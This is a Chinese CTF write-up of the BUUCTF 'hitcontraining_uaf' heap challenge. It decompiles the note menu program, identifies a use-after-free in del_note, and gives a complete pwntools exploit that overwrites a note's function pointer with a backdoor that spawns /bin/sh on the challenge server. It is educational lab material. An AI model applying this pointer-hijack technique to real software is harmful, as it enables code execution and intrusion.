
# [原创][buuctf刷题记录]hitcontraining_uaf

# 1. 看保护

是32位程序，Partial RELRO表明可以劫持got表，没有开canary和pie，开了NX栈不可执行

![图片描述](upload/attach/202511/1002337_AAXJWKEGYN63TCY.webp)

# 2. 看源码

## main函数

可以看出是典型的菜单题，打印`menu`，根据选项调用`add_note`，`del_note`，`print_note`和`exit`函数

```c
int \_\_cdecl \_\_noreturn main(int argc, const char \*\*argv, const char \*\*envp)
{
int v3; // eax
char buf[4]; // [esp+0h] [ebp-Ch] BYREF
int \*p\_argc; // [esp+4h] [ebp-8h]
p\_argc = &argc;
setvbuf(stdout, 0, 2, 0);
setvbuf(stdin, 0, 2, 0);
while ( 1 )
{
while ( 1 )
{
menu();
read(0, buf, 4u);
v3 = atoi(buf);
if ( v3 != 2 )
break;
del\_note();
}
if ( v3 > 2 )
{
if ( v3 == 3 )
{
print\_note();
}
else
{
if ( v3 == 4 )
exit(0);
LABEL\_13:
puts("Invalid choice");
}
}
else
{
if ( v3 != 1 )
goto LABEL\_13;
add\_note();
}
}
}
```

## menu函数

跟`main`函数看到的流程差不多，有add，delete，print三个功能

```c
int menu()
{
puts("----------------------");
puts("       HackNote       ");
puts("----------------------");
puts(" 1. Add note          ");
puts(" 2. Delete note       ");
puts(" 3. Print note        ");
puts(" 4. Exit              ");
puts("----------------------");
return printf("Your choice :");
}
```

## add_note函数

可以看出`notelist`添加的的上限是6个，之后首先`malloc`一个`0x8`大小的`chunk`（记为`chunk_note`）存入`notelist`数组，接着 `**((_DWORD **)&notelist + i) = print_note_content;`这里是将`chunk_note`数据部分的前`0x4`个字节存放`puts`函数的地址，`chunk_note`的后`0x4`个字节用来存放用户想要申请的`chunk`，这个`chunk`的大小是用户自定义的。

```c
int add\_note()
{
int result; // eax
int v1; // esi
char buf[8]; // [esp+0h] [ebp-18h] BYREF
size\_t size; // [esp+8h] [ebp-10h]
int i; // [esp+Ch] [ebp-Ch]
result = count;
if ( count > 5 )
return puts("Full");
for ( i = 0; i <= 4; ++i )
{
result = \*((\_DWORD \*)&notelist + i);
if ( !result )
{
\*((\_DWORD \*)&notelist + i) = malloc(8u);
if ( !\*((\_DWORD \*)&notelist + i) )
{
puts("Alloca Error");
exit(-1);
}
\*\*((\_DWORD \*\*)&notelist + i) = print\_note\_content;
printf("Note size :");
read(0, buf, 8u);
size = atoi(buf);
v1 = \*((\_DWORD \*)&notelist + i);
\*(\_DWORD \*)(v1 + 4) = malloc(size);
if ( !\*(\_DWORD \*)(\*((\_DWORD \*)&notelist + i) + 4) )
{
puts("Alloca Error");
exit(-1);
}
printf("Content :");
read(0, \*(void \*\*)(\*((\_DWORD \*)&notelist + i) + 4), size);
puts("Success !");
return ++count;
}
}
return result;
}
```

`notelist`运行一次`add_note`的情况如下图

![图片描述](upload/attach/202511/1002337_7GEWQJ3VUNP6BZZ.webp)

## delete_note函数

可以看到该函数在`free`两个`chunk`时，没有将对应值置为`null`，这会导致uaf即use after free

```c
int del\_note()
{
int result; // eax
char buf[4]; // [esp+8h] [ebp-10h] BYREF
int v2; // [esp+Ch] [ebp-Ch]
printf("Index :");
read(0, buf, 4u);
v2 = atoi(buf);
if ( v2 < 0 || v2 >= count )
{
puts("Out of bound!");
\_exit(0);
}
result = \*((\_DWORD \*)&notelist + v2);
if ( result )
{
free(\*(void \*\*)(\*((\_DWORD \*)&notelist + v2) + 4));
free(\*((void \*\*)&notelist + v2));
return puts("Success");
}
return result;
}
```

## print_note函数

从前面可以知道每调用一次`add_note`函数，就会产生两个`chunk`，记为`chunk0`,`chunk1`，`chunk1`的size可以自定义，`print_note`函数就是用`chunk0`的前`0x4`个字节`puts`函数来打印`chunk1`的数据部分。

```c
int print\_note()
{
int result; // eax
char buf[4]; // [esp+8h] [ebp-10h] BYREF
int v2; // [esp+Ch] [ebp-Ch]
printf("Index :");
read(0, buf, 4u);
v2 = atoi(buf);
if ( v2 < 0 || v2 >= count )
{
puts("Out of bound!");
\_exit(0);
}
result = \*((\_DWORD \*)&notelist + v2);
if ( result )
return (\*\*((int (\_\_cdecl \*\*\*)(\_DWORD))&notelist + v2))(\*((\_DWORD \*)&notelist + v2));
return result;
}
```

## magic函数

程序还给了一个后门函数，只要我们能够成功调用这个函数就行了。

```c
int magic()
{
return system("/bin/sh");
}
```

# 3. 利用思路

利用uaf将`chunk1`的前`0x4`个字节存放的`puts`函数的地址修改为`magic`函数的地址，使得在执行`print_note`功能时，却是调用`magic`函数。

```
add(0x8,b'aaa')
add(0x8,b'aaa')
add(0x18,b'aaa')
```

我们可以先调用三个`add_note`，设置`chunk1`的size分别为`0x8`，`0x8`，`0x16`

```
delete(1)
delete(2)
```

之后`free`第1和第2个note，我用`notelist[下标].chunk0|1`来表示每个`chunk`，此时fastbin中数据部分只有`0x8`大小的链表是`fastbin -> notelist[2].chunk0 -> nostlist[1].chunk0 -> notelist[1].chunk1`

数据部分`0x16`大小的fastbin -> `notelist[2].chunk1`

```
payload = p32(magic)
add(0x8,payload)
print(1)
```

再接着调用`add_note`就可以使得分配得到的`notelist[3].chunk1`和`notelist[1].chunk0`是一致的，因此我们也就能修改`notelist[1].chunk0`，也就将`puts_addr`改成`magic`的地址，接着执行`print_note`函数，最终执行`magic`函数，拿到shell。

最后大概是这样子，图有点丑。。。

![图片描述](upload/attach/202511/1002337_8WTPXRF7H6AJMDN.webp)

# 4. exp

```
from pwn import \*
context(arch = 'amd64',os = 'linux',log\_level = 'debug')
#io = process('./hacknote')
#gdb.attach(io,"b \*0x08048A75")
elf = ELF("./hacknote")
io=remote("node5.buuoj.cn",25034)
def add(size,payload):
io.recvuntil(b"Your choice :")
io.send(b'1')
io.recvuntil(b"Note size :")
io.send(str(size).encode())
io.recvuntil(b"Content :")
io.send(payload)
def delete(index):
io.recvuntil(b"Your choice :")
io.send(b'2')
io.recvuntil(b"Index :")
io.send(str(index).encode())
def print(index):
io.recvuntil(b"Your choice :")
io.send(b'3')
io.recvuntil(b"Index :")
io.send(str(index).encode())
magic = elf.symbols["magic"]
add(0x8,b'aaa')
add(0x8,b'aaa')
add(0x18,b'aaa')
delete(1)
delete(2)
payload = p32(magic)
add(0x8,payload)
print(1)
io.interactive()
```

![图片描述](upload/attach/202511/1002337_6VN44FR6UDTSEBD.webp)
